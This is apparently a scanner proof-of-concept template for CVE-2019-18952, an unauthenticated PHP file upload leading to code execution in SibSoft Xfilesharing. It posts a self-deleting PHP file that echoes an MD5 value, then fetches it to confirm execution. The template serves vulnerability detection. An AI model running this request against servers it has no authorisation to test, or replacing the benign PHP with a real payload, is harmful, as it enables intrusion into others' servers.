[info]
author = "ave"
description = "SibSoft Xfilesharing 2.5.1 及之前版本存在任意文件上传漏洞，攻击者可通过向 cgi-bin/up.cgi 端点发送 multipart/form-data 请求上传包含恶意代码的 PHP 文件，无需身份认证即可在目标服务器上执行任意代码，导致远程代码执行。"
id = "POC-AVE-2019-0139"
name = "CVE-2019-18952 PoC"
severity = "critical"
tags = ["ave-2019-0139"]
vuln_id = [
    "CVE-2019-18952",
    "AVE-2019-0139",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/up.cgi"
protocol = "http"

[poc.requests.body]
content = """
-----------------------------5825462663702204104870787337\r
Content-Disposition: form-data; name="sid"\r
\r
{{randstr}}\r
-----------------------------5825462663702204104870787337\r
Content-Disposition: form-data; name="file"; filename="{{to_lower(rand_text_alpha(5))}}.php"\r
Content-Type: application/php\r
\r
<?php\r
echo md5('999999999');\r
unlink(__FILE__);\r
?>\r
-----------------------------5825462663702204104870787337--"""
type = "raw"

[poc.requests.headers]
Content-Type = "multipart/form-data; boundary=---------------------------5825462663702204104870787337"
X-Requested-With = "XMLHttpRequest"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<OK>"]

[[poc.requests]]
method = "GET"
path = "/cgi-bin/temp/{{randstr}}/{{to_lower(rand_text_alpha(5))}}.php"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["{{md5(999999999)}}"]
